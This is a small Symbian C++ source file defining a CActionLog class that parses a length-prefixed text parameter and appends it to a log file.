/*
 * ActionLog.cpp
 *
 *  Created on: 27/set/2010
 *      Author: Giovanna
 */

#include "ActionLog.h"
#include <HT\LogFile.h>


CActionLog::CActionLog() :
	CAbstractAction(EAction_Log)
	{
	// No implementation required
	}

CActionLog::~CActionLog()
	{
	delete iLogText;
	}

CActionLog* CActionLog::NewLC(const TDesC8& params)
	{
	CActionLog* self = new (ELeave) CActionLog();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CActionLog* CActionLog::NewL(const TDesC8& params)
	{
	CActionLog* self = CActionLog::NewLC(params);
	CleanupStack::Pop(); // self;
	return self;
	}

void CActionLog::ConstructL(const TDesC8& params)
	{
		BaseConstructL(params);
		// TODO: parse params, verify
		TUint8* ptr = (TUint8 *)iParams.Ptr();
		TUint32 lenText = 0;   // in bytes including NULL terminator
		Mem::Copy(&lenText, ptr, 4);
		ptr += sizeof(TUint32);
		
		iLogText = HBufC8::NewL(lenText);
					
		if (lenText > 0)
		{
			TPtr8 ptrText((TUint8*)ptr,lenText,lenText);
			iLogText->Des().Append(ptrText);	
			//*iLogText = ptrText;
		}
			
	}

void CActionLog::DispatchStartCommandL()
	{
		RFs	fs;
		TInt err = fs.Connect();
		if(err == KErrNone)
			{
			CLogFile* logFile = CLogFile::NewLC(fs);
			logFile->CreateLogL(LOGTYPE_INFO);
			logFile->AppendLogL(*iLogText);
			logFile->CloseLogL();
			CleanupStack::PopAndDestroy(logFile);
			fs.Close();
			}
		MarkCommandAsDispatchedL();
	}

